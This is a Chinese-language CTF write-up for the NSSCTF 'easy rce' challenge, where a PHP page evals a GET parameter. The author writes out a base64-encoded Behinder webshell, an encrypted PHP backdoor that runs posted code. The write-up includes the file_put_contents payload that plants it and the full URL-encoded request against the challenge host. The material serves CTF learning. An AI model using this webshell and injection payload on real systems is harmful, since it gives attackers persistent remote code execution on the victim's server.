# easy rce

题目链接：https://www.nssctf.cn/problem/424



解题思路：

源码为：

```
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['url']))
{
eval($_GET['url']);
}
?>
```

考虑使用url参数，写入冰蝎webshell。本地测试写文件如下：

```
<?php 
eval("file_put_contents('./xxx.php',base64_decode(\"PD9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IC8v6K+l5a+G6ZKl5Li66L+e5o6l5a+G56CBMzLkvY1tZDXlgLznmoTliY0xNuS9je+8jOm7mOiupOi/nuaOpeWvhueggXJlYmV5b25kDQoJJF9TRVNTSU9OWydrJ109JGtleTsNCglzZXNzaW9uX3dyaXRlX2Nsb3NlKCk7DQoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7DQoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCgl7DQoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsNCgkJJHBvc3Q9JHQoJHBvc3QuIiIpOw0KCQkNCgkJZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7DQogICAgCQkJICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOyANCiAgICAJCQl9DQoJfQ0KCWVsc2UNCgl7DQoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOw0KCX0NCiAgICAkYXJyPWV4cGxvZGUoJ3wnLCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319DQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7DQo/Pg0K\"));");
?>
```

因此url需要传入的值如下：

```
file_put_contents("./xxx.php",base64_decode("PD9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IC8v6K+l5a+G6ZKl5Li66L+e5o6l5a+G56CBMzLkvY1tZDXlgLznmoTliY0xNuS9je+8jOm7mOiupOi/nuaOpeWvhueggXJlYmV5b25kDQoJJF9TRVNTSU9OWydrJ109JGtleTsNCglzZXNzaW9uX3dyaXRlX2Nsb3NlKCk7DQoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2
lucHV0Iik7DQoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCgl7DQoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsNCgkJJHBvc3Q9JHQoJHBvc3QuIiIpOw0KCQkNCgkJZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7DQogICAgCQkJICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOyANCiAgICAJCQl9DQoJfQ0KCWVsc2UNCgl7DQoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOw0KCX0NCiAgICAkYXJyPWV4cGxvZGUoJ3wnLCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319DQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7DQo/Pg0K"));
```

构造请求如下：

```
http://node5.anna.nssctf.cn:29987/?url=file%5Fput%5Fcontents%28%22%2E%2Fxxx%2Ephp%22%2Cbase64%5Fdecode%28%22PD9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IC8v6K%2Bl5a%2BG6ZKl5Li66L%2Be5o6l5a%2BG56CBMzLkvY1tZDXlgLznmoTliY0xNuS9je%2B8jOm7mOiupOi%2FnuaOpeWvhueggXJlYmV5b25kDQoJJF9TRVNTSU9OWydrJ109JGtleTsNCglzZXNzaW9uX3dyaXRlX2Nsb3NlKCk7DQoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2%0D%0AlucHV0Iik7DQoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCgl7DQoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsNCgkJJHBvc3Q9JHQoJHBvc3QuIiIpOw0KCQkNCgkJZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7DQogICAgCQkJICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOyANCiAgICAJCQl9DQoJfQ0KCWVsc2UNCgl7DQoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOw0KCX0NCiAgICAkYXJyPWV4cGxvZGUoJ3wnLCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319DQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7DQo%2FPg0K%22%29%29%3B
```

此时xxx.php已经写入，使用冰蝎进行连接，得到flag：

![image-20250511090100738](./images/20250511090009.png)
